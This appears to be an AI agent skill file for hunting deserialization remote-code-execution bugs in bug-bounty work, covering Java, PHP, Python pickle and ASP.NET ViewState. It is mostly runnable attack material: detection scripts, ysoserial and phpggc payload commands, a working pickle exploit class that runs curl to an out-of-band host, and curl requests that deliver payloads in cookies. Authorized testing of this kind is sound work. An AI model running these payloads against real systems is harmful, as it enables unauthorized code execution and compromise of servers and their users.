---
name: k1nzr3c0n-hunt-deserialization
description: "Deserialization RCE hunting skill. Covers Java ysoserial gadget chains, PHP object injection, Python pickle RCE, ASP.NET BinaryFormatter/ViewState, Ruby Marshal.load. Detect via magic bytes in cookies/parameters. OOB-or-it-didn't-happen gate."
tags: [deserialization, rce, java, php, python, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — Deserialization

> **OOB-or-nothing**: blind deserialization RCE needs interactsh callback proving execution.
> **Magic bytes**: Java=rO0A (base64 of 0xACED), PHP=O:, Python=gASV, .NET=AAEAAAD.

---

## Crown Jewels

```
Priority 1 — Java deserialization in cookies/parameters → ysoserial RCE
Priority 2 — PHP unserialize() with user input → POP chain → RCE
Priority 3 — Python pickle RCE → arbitrary code execution
Priority 4 — ASP.NET ViewState without MAC key → BinaryFormatter gadget
Priority 5 — Ruby Marshal.load with user input → RCE
```

---

## Phase 0 — Detect Serialized Data

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_deser_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
OOB="${OOB:-$(openssl rand -hex 6).oastify.com}"

echo "=== Deserialization Magic Byte Detection ==="

# Check all cookies and parameters for serialized data
RESP_HEADERS=$(curl -skI "https://${TARGET}/")

echo "Cookies:"
echo "$RESP_HEADERS" | grep -i 'set-cookie' | while read LINE; do
  COOKIE_VAL=$(echo "$LINE" | grep -oP '=[^;]+' | head -1 | cut -c2-)
  
  # Java: base64 decode and check for ACED magic
  echo "$COOKIE_VAL" | base64 -d 2>/dev/null | xxd | head -1 | grep -q 'ac ed' && \
    echo "  [JAVA SERIAL] Cookie: ${LINE:0:50}"
  
  # PHP: check for O: or a: prefix
  echo "$COOKIE_VAL" | grep -qP '^O:[0-9]+:|^a:[0-9]+:' && \
    echo "  [PHP SERIAL] Cookie: ${LINE:0:50}"
  
  # .NET: check for AAEAAAD
  echo "$COOKIE_VAL" | grep -q 'AAEAAAD' && \
    echo "  [.NET SERIAL] Cookie: ${LINE:0:50}"
done

# Check response body for serialized objects
RESP_BODY=$(curl -sk "https://${TARGET}/")
echo "$RESP_BODY" | grep -oP '__VIEWSTATE[^>]+value="[^"]+"' | head -3 | sed 's/^/  [VIEWSTATE] /'
```

## Phase 1 — Java Deserialization (ysoserial)

```bash
echo "=== Java Deserialization — ysoserial ==="
echo "Download: java -jar ysoserial.jar"
echo ""
OOB_ID=$(openssl rand -hex 4)

# Generate payloads for all gadget chains
GADGET_CHAINS=(
  "CommonsCollections1"
  "CommonsCollections2"
  "CommonsCollections3"
  "CommonsCollections4"
  "CommonsCollections5"
  "CommonsCollections6"
  "Spring1"
  "Spring2"
  "Groovy1"
  "BeanShell1"
  "URLDNS"        # OOB detection only — safest to use first
)

echo "Step 1: Test with URLDNS (OOB only, no code execution):"
echo "  java -jar ysoserial.jar URLDNS 'http://${OOB_ID}.${OOB}' | base64 -w0"
echo ""
echo "Step 2: If OOB hit confirmed → try RCE chains:"
echo "  java -jar ysoserial.jar CommonsCollections1 'curl http://${OOB_ID}.${OOB}/rce' | base64 -w0"
echo ""
echo "Step 3: Send payload in serialized cookie/parameter:"
echo "  curl -sk 'https://${TARGET}/' -H 'Cookie: session=PAYLOAD_BASE64'"
echo ""
echo "  [!] Check OOB: ${OOB_ID}.${OOB}"
```

## Phase 2 — PHP Object Injection

```bash
echo "=== PHP Object Injection ==="
BASE="https://${TARGET}"

# Find PHP serialized cookies
COOKIES=$(curl -skI "${BASE}/" | grep -i 'set-cookie')
echo "$COOKIES" | grep -oP '[a-zA-Z_]+=[^;]+' | while read COOKIE; do
  VAL=$(echo "$COOKIE" | cut -d= -f2-)
  echo "$VAL" | grep -qP '^O:[0-9]|^a:[0-9]|^s:[0-9]' && \
    echo "  [PHP SERIAL] Found: $COOKIE"
done

echo ""
echo "=== PHP POP Chain via Object Injection ==="
echo "Common magic methods to chain:"
echo "  __wakeup() — called on unserialize"
echo "  __destruct() — called on object destruction"
echo "  __toString() — called when object used as string"
echo ""
echo "Test payload (null-byte injection to skip __wakeup in PHP 5.6.25-):"
PAYLOAD='O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:8:"anything";}'
ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$PAYLOAD")
curl -sk "${BASE}/api/user?data=${ENCODED}" | head -5

echo ""
echo "phpggc — PHP gadget chain generator:"
echo "  phpggc Laravel/RCE1 system 'id'"
echo "  phpggc Symfony/RCE4 exec 'curl http://${OOB}/rce'"
```

## Phase 3 — Python Pickle RCE

```bash
echo "=== Python Pickle RCE ==="
OOB_ID=$(openssl rand -hex 4)

# Generate pickle payload
python3 << PYEOF
import pickle, base64, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://${OOB_ID}.${OOB}/pickle-rce',))

payload = pickle.dumps(Exploit())
print("Pickle payload (base64):")
print(base64.b64encode(payload).decode())
print(f"\nMagic bytes check: {payload[:2].hex()} (should be 8004 for protocol 4)")
PYEOF

echo ""
echo "Send in cookie/parameter that might be unpickled:"
echo "  curl -sk 'https://${TARGET}/' -H 'Cookie: session=PAYLOAD'"
echo "  [!] Check OOB: ${OOB_ID}.${OOB}"
```

## Phase 4 — ASP.NET ViewState / BinaryFormatter

```bash
echo "=== ASP.NET ViewState Deserialization ==="

# Extract ViewState from page
VS_RAW=$(curl -sk "https://${TARGET}/" | \
  grep -oP '(?<=id="__VIEWSTATE" value=")[^"]+' | head -1)
echo "  ViewState: ${VS_RAW:0:50}..."

# Check if MAC enabled (if padded with HMAC, harder to exploit)
VS_DECODED=$(echo "$VS_RAW" | base64 -d 2>/dev/null | xxd | head -3)
echo "  Decoded: $VS_DECODED"

echo ""
echo "Tools for ViewState exploitation:"
echo "  ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c 'curl http://${OOB:-OOB}/vs'"
echo "  ViewState Generator (Burp Extension)"
echo ""
echo "If __VIEWSTATEMAC=0 or encryption disabled → exploit possible"
echo "Check response: does error mention 'ViewState MAC validation' if tampered?"
```

## Gate 0

```bash
echo "=== Deserialization Gate 0 ==="
echo "  □ OOB: DNS or HTTP callback received (URLDNS gadget confirms RCE path)"
echo "  □ RCE: 'id' output in response OR OOB HTTP with command output in path"
echo "  □ Gadget chain: confirm classpath has required library (check error messages)"
echo "  □ PHP: object class exists in target's codebase (check source/error)"
echo "  □ Pickle: endpoint actually unpickles received data (timing/error difference)"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Java deserialization RCE in [session cookie]: ysoserial CommonsCollections5 gadget executes OS commands — confirmed with OOB callback (uid=33 in URL path)
PHP object injection via unsanitized unserialize() in [?data= parameter] leads to RCE via POP chain (Symfony gadget)
Python pickle deserialization in [/api/load] executes attacker-controlled OS commands — confirmed with DNS/HTTP callback
```
